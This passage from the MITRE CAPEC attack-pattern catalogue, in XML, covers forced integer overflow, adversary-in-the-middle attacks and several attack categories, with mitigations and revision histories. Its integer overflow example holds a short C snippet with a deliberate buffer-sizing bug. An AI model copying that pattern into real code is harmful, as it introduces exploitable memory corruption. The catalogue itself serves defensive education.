               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="92" Name="Forced Integer Overflow" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="128" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>The first step is exploratory meaning the attacker looks for an integer variable that they can control.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>The attacker finds an integer variable that they can write into or manipulate and try to get the value of the integer out of the possible range.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>The integer variable is forced to have a value out of range which set its final value to an unexpected value.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>The target host acts on the data and unexpected behavior may happen.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The attacker can manipulate the value of an integer variable utilized by the target host.</ns0:Prerequisite>
            <ns0:Prerequisite>The target host does not do proper range checking on the variable before utilizing it.</ns0:Prerequisite>
            <ns0:Prerequisite>When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">An attacker can simply overflow an integer by inserting an out of range value.</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>Run Arbitrary Code</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Unreliable Execution</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use a language or compiler that performs automatic bounds checking.</ns0:Mitigation>
            <ns0:Mitigation>Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.</ns0:Mitigation>
            <ns0:Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</ns0:Mitigation>
            <ns0:Mitigation>Always do bound checking before consuming user input data.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544</ns0:Example>
            <ns0:Example>
               <html:p>The following code illustrates an integer overflow. The declaration of total integer as "unsigned short int" assumes that the length of the first and second arguments fits in such an integer [REF-547], [REF-548].</html:p>
               <html:div style="margin-left:1em;" class="informative">include &lt;stdlib.h&gt;<html:br />include &lt;string.h&gt;<html:br />include &lt;stdio.h&gt;<html:br />
                  <html:br />int main (int argc, char *const *argv)<html:br />{<html:div style="margin-left:1em;">if (argc !=3){<html:div style="margin-left:1em;">printf("Usage: prog_name &lt;string1&gt; &lt;string2&gt;\n");<html:br />exit(-1);</html:div>
                     <html:br />}<html:br />unsigned short int total;<html:br />total = strlen(argv[1])+strlen(argv[2])+1;<html:br />char * buff = (char *)malloc(total);<html:br />strcpy(buff, argv[1]);<html:br />strcpy(buff, argv[2]);</html:div>
                  <html:br />}</html:div>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="190" />
            <ns0:Related_Weakness CWE_ID="128" />
            <ns0:Related_Weakness CWE_ID="120" />
            <ns0:Related_Weakness CWE_ID="122" />
            <ns0:Related_Weakness CWE_ID="196" />
            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>03</ns0:Entry_ID>
               <ns0:Entry_Name>Integer Overflows</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-131" />
            <ns0:Reference External_Reference_ID="REF-547" Section="Test Case ID 1511" />
            <ns0:Reference External_Reference_ID="REF-548" Section="Page 152, Figure 5-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations, References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="94" Name="Adversary in the Middle (AiTM)" Abstraction="Meta" Status="Stable">
         <ns0:Description>
            <html:p>An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themself within the communication channel between the two components.</html:p>
         </ns0:Description>
         <ns0:Extended_Description>
            <html:p>Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first flows through the adversary, who has the opportunity to observe or alter it, before being passed on to the intended recipient as if it was never observed. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for these attacks yields an implicit lack of trust in communication or identify between two components.</html:p>
            <html:p>These attacks differ from Sniffing Attacks (CAPEC-157) since these attacks often modify the communications prior to delivering it to the intended recipient.</html:p>
         </ns0:Extended_Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>Man-in-the-Middle / MITM</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>Person-in-the-Middle / PiTM</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>Monkey-in-the-Middle</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>Monster-in-the-Middle</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>On-path Attacker</ns0:Term>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="151" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="668" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.</ns0:Description>
               <ns0:Technique>Perform a sniffing attack and observe communication to determine a communication protocol.</ns0:Technique>
               <ns0:Technique>Look for application documentation that might describe a communication mechanism used by a target.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Position In Between Targets] The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.</ns0:Description>
               <ns0:Technique>Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.</ns0:Technique>
               <ns0:Technique>Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Use Intercepted Data Maliciously] The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.</ns0:Description>
               <ns0:Technique>Prevent some messages from reaching their destination, causing a denial of service.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>There are two components communicating with each other.</ns0:Prerequisite>
            <ns0:Prerequisite>An attacker is able to identify the nature and mechanism of communication between the two target components.</ns0:Prerequisite>
            <ns0:Prerequisite>An attacker can eavesdrop on the communication between the target components.</ns0:Prerequisite>
            <ns0:Prerequisite>Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.</ns0:Prerequisite>
            <ns0:Prerequisite>The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">This attack can get sophisticated since the attack may use cryptography.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Ensure Public Keys are signed by a Certificate Authority</ns0:Mitigation>
            <ns0:Mitigation>Encrypt communications using cryptography (e.g., SSL/TLS)</ns0:Mitigation>
            <ns0:Mitigation>Use Strong mutual authentication to always fully authenticate both ends of any communications channel.</ns0:Mitigation>
            <ns0:Mitigation>Exchange public keys using a secure channel</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="300" />
            <ns0:Related_Weakness CWE_ID="290" />
            <ns0:Related_Weakness CWE_ID="593" />
            <ns0:Related_Weakness CWE_ID="287" />
            <ns0:Related_Weakness CWE_ID="294" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1557</ns0:Entry_ID>
               <ns0:Entry_Name>Adversary-in-the-Middle</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Man-in-the-middle attack</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-553" />
            <ns0:Reference External_Reference_ID="REF-633" />
            <ns0:Reference External_Reference_ID="REF-634" />
            <ns0:Reference External_Reference_ID="REF-635" />
            <ns0:Reference External_Reference_ID="REF-636" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Examples-Instances, Related_Vulnerabilities</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Abstraction, Description, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Execution_Flow, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, @Status, Alternate_Terms, Description, Example_Instances, Execution_Flow, Mitigations, References, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2021-06-24">Man in the Middle Attack</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      </ns0:Attack_Patterns>
   <ns0:Categories>
      <ns0:Category ID="118" Name="Collect and Analyze Information" Status="Stable">
         <ns0:Summary>Attack patterns within this category focus on the gathering, collection, and theft of information by an adversary. The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="116" />
            <ns0:Has_Member CAPEC_ID="117" />
            <ns0:Has_Member CAPEC_ID="169" />
            <ns0:Has_Member CAPEC_ID="224" />
            <ns0:Has_Member CAPEC_ID="188" />
            <ns0:Has_Member CAPEC_ID="192" />
            <ns0:Has_Member CAPEC_ID="410" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Gather Information</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="119" Name="DEPRECATED: Deplete Resources" Status="Deprecated">
         <ns0:Summary>This category has been deprecated as it is no longer used by any of the Views.</ns0:Summary>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Prerequisites, Description, Related_Weaknesses, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-05-01">Deplete Resources</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="152" Name="Inject Unexpected Items" Status="Stable">
         <ns0:Summary>Attack patterns within this category focus on the ability to control or disrupt the behavior of a target either through crafted data submitted via an interface for data input, or the installation and execution of malicious code on the target system. The former happens when an adversary adds material to their input that is interpreted by the application causing the targeted application to perform steps unintended by the application manager or causing the application to enter an unstable state. Attacks of this type differ from Data Structure Attacks in that the latter attacks subvert the underlying structures that hold user-provided data, either pre-empting interpretation of the input (in the case of Buffer Overflows) or resulting in values that the targeted application is unable to handle correctly (in the case of Integer Overflows). In Injection attacks, the input is interpreted by the application, but the attacker has included instructions to the interpreting functions that the target application then follows.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="137" />
            <ns0:Has_Member CAPEC_ID="175" />
            <ns0:Has_Member CAPEC_ID="240" />
            <ns0:Has_Member CAPEC_ID="242" />
            <ns0:Has_Member CAPEC_ID="248" />
            <ns0:Has_Member CAPEC_ID="549" />
            <ns0:Has_Member CAPEC_ID="624" />
            <ns0:Has_Member CAPEC_ID="594" />
            <ns0:Has_Member CAPEC_ID="586" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Injection</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="156" Name="Engage in Deceptive Interactions" Status="Stable">
         <ns0:Summary>Attack patterns within this category focus on malicious interactions with a target in an attempt to deceive the target and convince the target that it is interacting with some other principal and as such take actions based on the level of trust that exists between the target and the other principal. These types of attacks assume that some piece of content or functionality is associated with an identity and that the content / functionality is trusted by the target because of this association. Often identified by the term "spoofing", these types of attacks rely on the falsification of the content and/or identity in such a way that the target will incorrectly trust the legitimacy of the content. For example, an attacker may modify a financial transaction between two parties so that the participants remain unchanged but the amount of the transaction is increased. If the recipient cannot detect the change, they may incorrectly assume the modified message originated with the original sender. Attacks of these type may involve an adversary crafting the content from scratch or capturing and modifying legitimate content.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="148" />
            <ns0:Has_Member CAPEC_ID="151" />
            <ns0:Has_Member CAPEC_ID="154" />
            <ns0:Has_Member CAPEC_ID="173" />
            <ns0:Has_Member CAPEC_ID="416" />
            <ns0:Has_Member CAPEC_ID="690" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2017-01-09">Deceptive Interactions</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="172" Name="Manipulate Timing and State" Status="Stable">
         <ns0:Summary>An attacker exploits weaknesses in timing or state maintaining functions to perform actions that would otherwise be prevented by the execution flow of the target code and processes. An example of a state attack might include manipulation of an application's information to change the apparent credentials or similar information, possibly allowing the application to access material it would not normally be allowed to access. A common example of a timing attack is a test-action race condition where some state information is tested and, if it passes, an action is performed. If the attacker can change the state between the time that the application performs the test and the time the action is performed, then they might be able to manipulate the outcome of the action to malicious ends.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="25" />
            <ns0:Has_Member CAPEC_ID="26" />
            <ns0:Has_Member CAPEC_ID="74" />
         </ns0:Relationships>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Category>
      <ns0:Category ID="210" Name="Abuse Existing Functionality" Status="Stable">
         <ns0:Summary>An adversary uses or manipulates one or more functions of an application in order to achieve a malicious objective not originally intended by the application, or to deplete a resource to the point that the target's functionality is affected. This is a broad class of attacks wherein the adversary is able to alter the intended result or purpose of the functionality and thereby affect application behavior or information integrity. Outcomes can range from information exposure, vandalism, degrading or denial of service, as well as execution of arbitrary code on the target machine.</ns0:Summary>
         <ns0:Relationships>
            <ns0:Has_Member CAPEC_ID="113" />
            <ns0:Has_Member CAPEC_ID="125" />
            <ns0:Has_Member CAPEC_ID="130" />
            <ns0:Has_Member CAPEC_ID="131" />
            <ns0:Has_Member CAPEC_ID="212" />
            <ns0:Has_Member CAPEC_ID="216" />
            <ns0:Has_Member CAPEC_ID="227" />
            <ns0:Has_Member CAPEC_ID="272" />
            <ns0:Has_Member CAPEC_ID="554" />
         </ns0:Relationships>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>42</ns0:Entry_ID>
               <ns0:Entry_Name>Abuse of Functionality</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
